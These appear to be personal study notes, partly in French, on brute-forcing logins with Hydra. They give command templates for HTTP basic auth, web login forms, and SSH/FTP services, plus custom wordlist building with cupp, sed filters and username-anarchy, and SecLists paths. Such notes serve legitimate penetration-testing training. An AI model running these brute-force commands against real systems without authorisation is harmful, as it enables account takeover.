# Hydra

---

`Toujours inspecter la page pour determiner les paramètres de login`
`Toujours faire un nmap pou connaître le service déployé`

---

| **Password Attack Type** |
| --------------|
| Dictionary attack | 
| Brute force |
| Traffic interception |
| Man In the Middle |
| Key Logging |
| Social engineering |

--- 

## Basic HTTP Auth Brute Forcing


```bash
# -C : combined credential
# <Method Request> : http-get , 
# -f : stop after the first successful login
# -p | -l  <Password|username> : specify the non bruteforce parameter to use
```

```bash
# basic
hydra -C <Wordlist> <ServerIP> -s <Port> <Method Request> /<Path>
```

```bash
# 
hydra -L <UsernameWordList> -P <PasswordWordlist> -u -f <IP> -s <Port> <Method> /<Path>
```

---
## Web Forms Brute Forcing

* Hydra requests
    ```bash
    hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
    ```

*  Parametres
    * Pour copier les paramètres de la requette dans le navigateur : 
        * inspecter le code 
        * **copy as curl | copy post data**
    ```bash
    # display parameters
    hydra <RequestMethod> -U 

    #ex : 
    <form name='login' autocomplete='off' class='form' action='' method='post'>
    hydra -L <Dico> -P <Dico> <RequestType> "/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"
    ```

---

## Service Authentication Attacks

### Custom Wordlist 

###### Creation d'un dictionnaire password grâce au social engeneering ( questions sur la cible ) : 

    ```bash
    cupp -i 
    ```

###### Filtrage de mot de passe : 

    ```bash
    sed -ri '/^.{,7}$/d' <Wordlist>            # remove shorter than 8
    sed -ri '/[!-/:-@\[-`\{-~]+/!d' <Wordlist> # remove no special chars
    sed -ri '/[0-9]+/!d' <Wordlist>            # remove no numbers
    ```
###### Mangling => The Mentalist | rsmangler : Permutation de mot de passe

###### Custom Username Wordlist : Username Anarchy

```bash
 git clone https://github.com/urbanadventurer/username-anarchy.git
 ./username-anarchy <String> > <Output>
```

### Attack SSH sever 

```bash
# -t 4 : parallel attempts
hydra service://SERVER_IP:PORT


# sur la cible
# afficher les ftp disponible
netstat -antp | grep -i list

hydra -l <username> -P <dico> ftp://<ftpAddress>
```

---

---

## Ressources 

### Dictionnaire :

* Seclists credentials :`/opt/useful/SecLists/Passwords/Default-Credentials`
* Seclists names : `/opt/useful/SecLists/Usernames/Names/names.txt`
* seclists usernames common : `/opt/useful/SecLists/Usernames/cirt-default-usernames.txt` | CommonAdminbase64

